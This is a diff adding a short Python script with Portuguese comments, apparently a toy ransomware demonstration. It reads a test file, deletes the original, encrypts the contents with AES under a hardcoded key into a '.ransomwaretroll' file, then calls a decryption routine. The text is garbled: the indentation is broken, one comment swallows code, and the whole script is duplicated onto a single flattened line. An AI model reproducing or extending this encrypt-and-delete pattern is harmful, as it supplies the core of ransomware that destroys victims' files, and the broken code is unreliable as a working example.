@@ -1,0 +1,50 @@
+import os 
+import pyaes 
+
+# Função para descriptografar o arquivo 
+	def descriptografar(file_name, key): 
+
+# Abrir o arquivo criptografado file = open(file_name, "rb") 
+	crypto_data = file.read() 
+	file.close() 
+
+# Inicializar o AES com a chave fornecida
+aes = pyaes.AESModeOfOperationCTR(key) 
+
+# Descriptografar o arquivo 
+decrypted_data = aes.decrypt(crypto_data) 
+
+# Salvar o arquivo descriptografado 
+new_file = file_name.replace(".ransomwaretroll", "") 
+new_file = open(new_file, 'wb') 
+new_file.write(decrypted_data) 
+new_file.close() 
+
+# Nome do arquivo e chave de criptografia 
+file_name = "teste.txt" 
+key = b"testeransomwares" 
+
+# Criptografar o arquivo 
+file = open(file_name, "rb") 
+file_data = file.read() 
+file.close() 
+
+# Remover o arquivo original 
+os.remove(file_name) 
+aes = pyaes.AESModeOfOperationCTR(key) 
+crypto_data = aes.encrypt(file_data) 
+
+# Salvar o arquivo criptografado 
+new_file = file_name + ".ransomwaretroll" 
+new_file = open(new_file, 'wb') 
+new_file.write(crypto_data) 
+new_file.close() 
+
+# Descriptografar o arquivo descriptografar
+new_file.name,import os import pyaes # Função para descriptografar o arquivo def descriptografar(file_name, key): # Abrir o arquivo criptografado file = open(file_name, "rb") crypto_data = file.read() file.close() # Inicializar o AES com a chave fornecida aes = pyaes.AESModeOfOperationCTR(key) # Descriptografar o arquivo decrypted_data = aes.decrypt(crypto_data) # Salvar o arquivo descriptografado new_file = file_name.replace(".ransomwaretroll", "") new_file = open(new_file, 'wb') new_file.write(decrypted_data) new_file.close() # Nome do arquivo e chave de criptografia file_name = "teste.txt" key = b"testeransomwares" # Criptografar o arquivo file = open(file_name, "rb") file_data = file.read() file.close() # Remover o arquivo original os.remove(file_name) aes = pyaes.AESModeOfOperationCTR(key) crypto_data = aes.encrypt(file_data) # Salvar o arquivo criptografado new_file = file_name + ".ransomwaretroll" 
+new_file = open(new_file, 'wb') 
+new_file.write(crypto_data) 
+new_file.close() 
+
+# Descriptografar o arquivo descriptografar
+(new_file.name, key)
